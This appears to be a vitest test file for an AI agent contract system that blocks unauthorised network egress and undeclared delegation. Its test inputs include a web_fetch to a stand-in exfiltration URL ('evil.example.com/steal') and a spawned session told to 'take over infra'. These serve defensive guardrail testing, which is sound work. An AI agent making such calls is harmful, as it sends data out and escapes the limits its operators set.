import { describe, expect, it } from "vitest";

import { resolveAgentContract, validateContract } from "../src/contracts.js";

describe("contracts", () => {
  it("gives orchestrator a control-plane contract", () => {
    const contract = resolveAgentContract("OpenClaw Orchestrator", "General Agent");
    expect(contract.role).toBe("Orchestration / Control Plane");
    expect(contract.allowedDelegationTargets).toContain("*");
  });

  it("blocks network egress outside trusted set for research", () => {
    const contract = resolveAgentContract("Shroud Research", "Research");
    const violation = validateContract(
      contract,
      "web_fetch",
      { url: "https://evil.example.com/steal" },
      ["slack"],
      new Set<string>(),
    );
    expect(violation?.signatureId).toBe("contract_egress");
  });

  it("blocks undeclared delegation targets for coaching", () => {
    const contract = resolveAgentContract("Coach Alessandra", "Coaching / Training");
    const violation = validateContract(
      contract,
      "sessions_spawn",
      { agentId: "random-devops-agent", message: "take over infra" },
      ["slack"],
      new Set<string>(),
    );
    expect(violation?.signatureId).toBe("contract_delegation");
  });
});
